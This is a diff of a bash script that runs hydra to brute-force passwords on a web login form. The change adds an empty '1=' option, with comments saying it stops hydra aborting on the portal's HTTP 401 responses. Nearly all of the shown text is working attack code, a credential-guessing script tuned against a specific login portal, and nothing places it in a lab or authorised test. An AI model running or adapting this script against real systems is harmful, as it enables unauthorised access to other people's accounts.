@@ -37,15 +37,18 @@ FORM="username=^USER^&password=^PASS^"
 echo "[*] target : ${TARGET}:${PORT}"
 echo "[*] user   : ${USER}"
 echo "[*] wordlist: ${WORDLIST}"
-echo "[*] form   : ${LOGIN_PATH} [${FORM}] F=${FAIL_STRING}"
+echo "[*] form   : ${LOGIN_PATH} [${FORM}] 1= F=${FAIL_STRING}"
 echo
 
-# hydra http-post-form syntax:  "/path:POSTBODY:F=FAILSTRING"
+# hydra http-post-form syntax:  "/path:POSTBODY:1=:F=FAILSTRING"
+# NOTE: the empty "1=" tells hydra to ACCEPT HTTP error codes (e.g. 401) as a
+# normal response instead of aborting with "the target may be using HTTP auth".
+# This portal returns HTTP 401 on a failed login, so 1= is REQUIRED here.
 hydra -l "$USER" -P "$WORDLIST" \
       -s "$PORT" \
       -t 16 -f -V \
       "${TARGET}" \
-      http-post-form "${LOGIN_PATH}:${FORM}:F=${FAIL_STRING}"
+      http-post-form "${LOGIN_PATH}:${FORM}:1=:F=${FAIL_STRING}"
 
 echo
 echo "[*] Done. hydra prints a green [${PORT}][http-post-form] host: ... password: <PW> line on success."
